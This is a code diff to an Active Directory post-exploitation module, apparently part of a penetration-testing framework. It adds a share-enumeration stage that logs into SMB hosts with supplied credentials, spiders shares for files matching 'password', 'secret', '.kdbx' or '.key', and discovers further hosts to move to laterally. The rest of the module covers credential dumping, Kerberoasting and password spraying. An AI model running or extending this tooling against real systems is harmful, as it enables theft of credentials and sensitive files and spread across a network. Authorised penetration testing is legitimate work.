@@ -2,8 +2,8 @@
 Armagedon AD Post-Exploitation Enumeration Module
 
 Full automated AD post-exploitation loop: credential testing, host enumeration,
-credential dumping, LDAP enumeration, Kerberoasting, hash cracking, and password
-spraying. Mirrors the standalone ad_post_enum.sh workflow.
+credential dumping, LDAP enumeration, Kerberoasting, hash cracking, password
+spraying, and shared drives enumeration. Mirrors the standalone ad_post_enum.sh workflow.
 
 Tools used: nxc (NetExec), impacket (GetUserSPNs/GetNPUsers), john, nmap, xfreerdp.
 All operations are non-destructive READ in CHECK mode.
@@ -40,7 +40,7 @@ OPTIONS = {
     "DOMAIN": "",
     "OUTPUT_DIR": "",
     "MODE": "FULL",
-    "STEPS": "TEST,ENUM,DUMP,LDAP,KERB,CRACK,SPRAY",
+    "STEPS": "TEST,ENUM,DUMP,LDAP,KERB,CRACK,SPRAY,SHARE",
     "WORDLIST": "/usr/share/wordlists/rockyou.txt",
     "VERBOSE": False,
 }
@@ -54,7 +54,7 @@ DESCRIPTIONS = {
     "DOMAIN": "Active Directory domain (e.g. COOCTUS.CORP)",
     "OUTPUT_DIR": "Output directory (auto-generated if empty)",
     "MODE": "FULL | ENUM | DUMP | KERB | CRACK | SPRAY (which stages to run)",
-    "STEPS": "Comma-separated step list for FULL mode",
+    "STEPS": "Comma-separated step list: TEST,ENUM,DUMP,LDAP,KERB,CRACK,SPRAY,SHARE",
     "WORDLIST": "John wordlist for hash cracking",
     "VERBOSE": "Print every nxc/impacket command output",
 }
@@ -223,6 +223,209 @@ def _rdp_screenshot(target, user, passwd, output_dir):
             print(f"  [!] RDP info saved to {info_path}")
 
 
+# ─── Stage: Shared drives enumeration ────────────────────────────────────────
+
+def _enumerate_shares(target, user, passwd, domain, output_dir):
+    """Enumerate all accessible SMB shares, check permissions, spider content.
+
+    Steps:
+      1. nxc --shares  → list all shares with READ/WRITE/DENY access flags
+      2. nxc --dir     → list root content of every accessible share
+      3. nxc --spider  → spider accessible shares for interesting files
+      4. net view       → secondary share listing via SMB exec
+      5. net view \\\\host → discover other hosts, then enumerate their shares
+    """
+    print(f"\n{'='*60}")
+    print("  STAGE: Shared Drives Enumeration")
+    print(f"{'='*60}")
+
+    share_dir = os.path.join(output_dir, "shares")
+    os.makedirs(share_dir, exist_ok=True)
+
+    nxc = _find_nxc()
+    if not nxc:
+        print("  [-] nxc not found — skipping share enumeration")
+        return {"shares_found": 0, "accessible": 0}
+
+    bare = user
+    if "\\" in user:
+        bare = user.split("\\", 1)[1]
+    if "@" in user:
+        bare = user.split("@")[0]
+
+    user_fmt = f"{domain}\\{bare}" if domain else bare
+
+    shares_found = []
+    accessible_shares = []
+    lateral_hosts = []
+
+    # ── Step 1: nxc --shares ──────────────────────────────────────────────
+    print("  [1/5] Enumerating shares via nxc --shares ...")
+    cmd = f'{nxc} smb {target} -u "{user_fmt}" -p "{passwd}" --shares'
+    stdout, _, rc = _run_cmd(cmd, timeout=60)
+
+    shares_file = os.path.join(share_dir, "all_shares.txt")
+    with open(shares_file, "w") as f:
+        f.write(f"# nxc --shares output for {target}\n")
+        f.write(f"# User: {domain}\\{bare}\n")
+        f.write(f"# Timestamp: {datetime.now().isoformat()}\n\n")
+        f.write(stdout or "(no output)")
+
+    if stdout:
+        for line in stdout.splitlines():
+            line_stripped = line.strip()
+            # nxc --shares output: ShareName  Permissions  Comment
+            # or CSV-like: ShareName,READ,WRITE,...
+            parts = line_stripped.split()
+            if len(parts) >= 1 and parts[0] and not line_stripped.startswith("#"):
+                # Skip header lines like "ShareName  Permissions"
+                if parts[0].lower() in ("sharename", "share", "name"):
+                    continue
+                share_name = parts[0]
+                # Detect access level from remaining tokens
+                rest = " ".join(parts[1:]).upper()
+                access = "UNKNOWN"
+                if "WRITE" in rest or "FULL" in rest:
+                    access = "WRITE"
+                elif "READ" in rest:
+                    access = "READ"
+                elif "DENY" in rest or "NO ACCESS" in rest:
+                    access = "DENY"
+                shares_found.append({"name": share_name, "access": access})
+
+    print(f"  [+] Found {len(shares_found)} shares via nxc --shares")
+
+    # ── Step 2: nxc --dir for every accessible share ──────────────────────
+    print("  [2/5] Listing content of accessible shares ...")
+    for sh in shares_found:
+        name = sh["name"]
+        if sh["access"] in ("DENY", "UNKNOWN"):
+            continue
+        accessible_shares.append(name)
+
+        print(f"      [*] {name} ({sh['access']}) — listing root ...")
+        dir_cmd = f'{nxc} smb {target} -u "{user_fmt}" -p "{passwd}" --share {name} --dir'
+        dir_out, _, _ = _run_cmd(dir_cmd, timeout=30)
+
+        safe_name = re.sub(r'[^\w\-.]', '_', name)
+        dir_file = os.path.join(share_dir, f"{safe_name}_dir.txt")
+        with open(dir_file, "w") as f:
+            f.write(f"# Share: {name}  Access: {sh['access']}\n\n")
+            f.write(dir_out or "(empty or access denied)")
+        print(f"          → {dir_file}")
+
+    if not accessible_shares:
+        print("  [-] No accessible shares found (all DENY or none listed)")
+
+    # ── Step 3: Spider accessible shares for interesting files ─────────────
+    print("  [3/5] Spidering accessible shares for interesting files ...")
+    interesting_patterns = (
+        r"\.txt$|\.doc$|\.docx$|\.pdf$|\.xlsx$|\.csv$"
+        r"|\.kdbx$|\.config$|\.xml$|\.json$|\.ini$"
+        r"|password|secret|credential|backup|confidential"
+        r"|\.kdb|\.pfx$|\.pem$|\.key$|\.ppk$"
+    )
+    spider_results = []
+    for share_name in accessible_shares:
+        print(f"      [*] Spidering {share_name} ...")
+        spider_cmd = (
+            f'{nxc} smb {target} -u "{user_fmt}" -p "{passwd}" '
+            f'--share {share_name} --spider {share_name} '
+            f'--spider-folder "" --content'
+        )
+        spider_out, _, _ = _run_cmd(spider_cmd, timeout=120)
+
+        safe_name = re.sub(r'[^\w\-.]', '_', share_name)
+        spider_file = os.path.join(share_dir, f"{safe_name}_spider.txt")
+        with open(spider_file, "w") as f:
+            f.write(f"# Spider results for {share_name}\n\n")
+            f.write(spider_out or "(no output)")
+
+        # Flag interesting files
+        for line in (spider_out or "").splitlines():
+            if re.search(interesting_patterns, line, re.IGNORECASE):
+                spider_results.append({"share": share_name, "file": line.strip()})
+
+    if spider_results:
+        interesting_file = os.path.join(share_dir, "interesting_files.txt")
+        with open(interesting_file, "w") as f:
+            f.write(f"# Interesting files found on shares\n\n")
+            for item in spider_results:
+                f.write(f"[{item['share']}] {item['file']}\n")
+        print(f"  [+] {len(spider_results)} interesting files flagged → {interesting_file}")
+    else:
+        print("  [-] No obviously interesting files found during spider")
+
+    # ── Step 4: net view (secondary enumeration via SMB exec) ──────────────
+    print("  [4/5] Listing shares via 'net view' ...")
+    netview_cmd = "net view"
+    netview_out = _exec_smb(target, user, passwd, netview_cmd, timeout=30)
+    netview_file = os.path.join(share_dir, "net_view.txt")
+    with open(netview_file, "w") as f:
+        f.write(f"# net view output from {target}\n\n")
+        f.write(netview_out or "(no output)")
+
+    # Extract hostnames from net view (lines like "\\HOSTNAME    ...")
+    hosts_from_netview = []
+    for line in (netview_out or "").splitlines():
+        m = re.match(r"\\\\(\S+)", line.strip())
+        if m:
+            hosts_from_netview.append(m.group(1))
+    if hosts_from_netview:
+        print(f"  [+] Discovered {len(hosts_from_netview)} other hosts via net view")
+        hosts_file = os.path.join(share_dir, "discovered_hosts.txt")
+        with open(hosts_file, "w") as f:
+            for h in hosts_from_netview:
+                f.write(h + "\n")
+
+    # ── Step 5: Enumerate shares on discovered hosts ───────────────────────
+    print("  [5/5] Enumerating shares on other domain hosts ...")
+    for host in hosts_from_netview:
+        # Skip the original target (already done)
+        if host.lower() == target.lower():
+            continue
+        print(f"      [*] {host} — listing shares ...")
+        hcmd = f'{nxc} smb {host} -u "{user_fmt}" -p "{passwd}" --shares'
+        hout, _, hrc = _run_cmd(hcmd, timeout=45)
+        if hout:
+            hfile = os.path.join(share_dir, f"shares_{re.sub(r'[^\\w\\-.]', '_', host)}.txt")
+            with open(hfile, "w") as f:
+                f.write(f"# Shares on {host}\n\n")
+                f.write(hout)
+            # Parse and check for accessible shares on this host
+            for hline in hout.splitlines():
+                parts = hline.strip().split()
+                if len(parts) >= 1 and parts[0] and parts[0].lower() not in ("sharename", "share", "name"):
+                    rest = " ".join(parts[1:]).upper()
+                    acc = "WRITE" if "WRITE" in rest or "FULL" in rest else ("READ" if "READ" in rest else "UNKNOWN")
+                    if acc != "DENY":
+                        lateral_hosts.append({"host": host, "share": parts[0], "access": acc})
+            if lateral_hosts:
+                print(f"          → accessible shares on {host}")
+
+    if lateral_hosts:
+        lateral_file = os.path.join(share_dir, "lateral_shares.txt")
+        with open(lateral_file, "w") as f:
+            f.write(f"# Accessible shares on other domain hosts\n\n")
+            for lh in lateral_hosts:
+                f.write(f"[{lh['host']}] {lh['share']} ({lh['access']})\n")
+        print(f"  [+] {len(lateral_hosts)} accessible shares on other hosts → {lateral_file}")
+
+    # ── Summary ────────────────────────────────────────────────────────────
+    total_accessible = len(accessible_shares) + len([lh for lh in lateral_hosts])
+    summary = {
+        "shares_found": len(shares_found),
+        "accessible": total_accessible,
+        "spider_hits": len(spider_results),
+        "lateral_hosts": len(set(lh["host"] for lh in lateral_hosts)),
+        "lateral_shares": len(lateral_hosts),
+        "output_dir": share_dir,
+    }
+    print(f"\n  [+] Share enumeration complete — {summary['accessible']} accessible shares across "
+          f"{summary['lateral_hosts'] + 1} hosts → {share_dir}")
+    return summary
+
+
 # ─── Stage: Full enumeration ──────────────────────────────────────────────────
 
 def _full_enum(target, user, passwd, domain, output_dir):
@@ -245,7 +448,6 @@ def _full_enum(target, user, passwd, domain, output_dir):
         "enterprise_admins.txt": 'net group "Enterprise Admins" /domain',
         "tasklist.txt": "tasklist /svc",
         "netstat.txt": "netstat -ano",
-        "shares.txt": "net share",
         "password_policy.txt": "net accounts",
         "saved_creds.txt": "cmdkey /list",
         "autologon.txt": 'reg query HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon',
@@ -679,7 +881,7 @@ def run(options=None, target=None, mode="CHECK", **kwargs):
     print(f"  Output:  {output_dir}")
     print(f"{'#'*60}")
 
-    steps_str = opts.get("STEPS", "TEST,ENUM,DUMP,LDAP,KERB,CRACK,SPRAY")
+    steps_str = opts.get("STEPS", "TEST,ENUM,DUMP,LDAP,KERB,CRACK,SPRAY,SHARE")
     steps = [s.strip().upper() for s in steps_str.split(",")]
 
     result = {
@@ -754,6 +956,11 @@ def run(options=None, target=None, mode="CHECK", **kwargs):
         if cracked_lines:
             tested = _test_cracked(rhosts, cracked_lines, domain, output_dir)
             result["stages"]["test_cracked"] = {"tested": tested}
+
+    # Step 9: Shared drives enumeration
+    if "SHARE" in steps:
+        share_result = _enumerate_shares(rhosts, working_user, passwd, domain, output_dir)
+        result["stages"]["shares"] = share_result
 
     _print_summary(output_dir, domain)
 
